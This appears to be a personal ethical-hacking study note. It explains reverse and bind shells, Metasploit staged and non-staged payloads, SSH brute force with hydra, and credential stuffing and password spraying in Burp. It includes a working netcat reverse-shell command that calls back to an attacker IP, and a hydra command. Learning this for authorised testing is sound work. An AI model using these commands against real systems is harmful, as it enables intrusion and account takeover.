---
tags:
- EH
MOC: Knowledge Base
---
[[_0000 Home|Home]] | [[_0001 Knowledge Base MOC|Back to Knowledge MOC]] | [[EH Ethical Hacking index|Back to index]]
## Reverse Shell vs Bind shell
### Netcat Reverse Shell
- Most common
	- You use it 95% of the time
- A shell gives you access to a machine
	- Attackbox listens - target connects
- A reverse shell is a shell that allows a victim to connect to you
	- You can have netcat active on the attackbox listening on a port, and the target connects to your IP on the same port via netcat
- Port forward or port trigger is needed to connect the target's public IP to the attackbox's private IP
- Example connection
	- Attacker: `nc -nvlp 4444`
	- Target: `nc 192.168.57.6 4444 -e /bin/bash`
- ![Netcat Reverse Shell](assets/Screenshot%20from%202025-09-03%2013-56-41.png)
### Netcat Bind Shell
- Less common
	- Mostly on external assessments
- Most useful when you need to bypass a firewall or when reverse shell isn't working
- The attackbox connects to the target
	- Attackbox connects - target listens
- We open a port on the target via an exploit, then connect to it via netcat
- No need for port forwarding since we connect the attackbox's public IP to the target's private IP
- ![Netcat Bind Shell](assets/Screenshot%20from%202025-09-03%2013-44-18.png)

## Staged vs Non-Staged Payloads
- A payload is what you run as an exploit
- There are different types of payloads
	- Windows payloads
	- Linux payloads
	- Meterpreter payload
		- An attack payload used in [[EH Hacking Tools#Metasploit |Metasploit]]
		- There are at least 500 payloads in [[EH Hacking Tools#Metasploit |Metasploit]] alone
- The main difference between a non-staged and a staged payload's syntax is the forward slash `/`
	- Non-staged
		- `windows/meterpreter_reverse_tcp`
	- Staged
		-  `windows/meterpreter/reverse_tcp`
### Staged payloads
- Sends exploit shell payload in stages
- Can be less stable than non-staged
### Non-Staged payloads
- Sends exploit shell code all at once
- Large in size than staged
- Doesn't always work
- ![Staged vs Non-staged](assets/Screenshot%20from%202025-09-04%2011-40-25.png)

## Brute Force
###  SSH
- **Refer To**:
	- [[NET Common ports and protocols#2. SSH - Secure Shell]]
- You can brute force attack it in a few ways
	- Using hydra
		- Syntax: `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.57.4:22 -t 4 -V`
			- -P is a password list
			- -t is the number of consecutive attempts or threads
			- -V is verbose
	- Using metasploit
		- Search for an auxiliary ssh login scanner
		- Use the found scanner
		- Check and set the options
		- The required options will be very similar to hydra
- You can use weak or default credentials to test password strength
- The assessment includes if the blue team can catch you
# Credential Stuffing and Password Spraying
### Credentials stuffing
- It's the act of injecting breached account credentials in hopes of an account takeover
- These credentials can be acquired from [[EH Reconnaissance#^ce5358|leaks]]
- Example attack using [[EH Hacking Tools#Butp suite|burp suite]] [[EH Hacking Tools#^cbb090|pitchfork]] attack
	- You're logging into a website for which you have leaked credentials
	- You select from intruder's positions tab the email value, and password value
	- You select pitchfork, and provide it via the payloads tab with a list of usernames for param 1 (the email value param) and a list of passwords for param 2 (the password value param)
	- Pitchfork will try each username of password of equal index together to attempt logging in with them
	- As the attack is running it will show you each attempt and its result
	- You can filter by unsuccessful attempts by checking the response of any of the attempts, and if it failed, copy the failure message then go to the options tab and add it in the grep feature
### Password spraying
- Disclaimer: you must always ask about the number of possible attempts before the account is locked
	- Trying this technique blindly with a bunch of employee usernames can cause mass account locking and DoS for the client company
- Example attack using [[EH Hacking Tools#Butp suite|burp suite]] [[EH Hacking Tools#^837b27|sniper]] attack
	- The start is the same as the pitchfork attack, but you select only the email value as your param
	- This attack will try every email in the list once with a common password
# BufferOverflow
- This topic is being discussed separately over here [[EH Buffer Overflow Steps]]
# Notes
- If a payload fails, try the other type
	- You send a non-staged payload and it fails, try a staged payload
	- Your failed payload was a reverse shell? Try a bind shell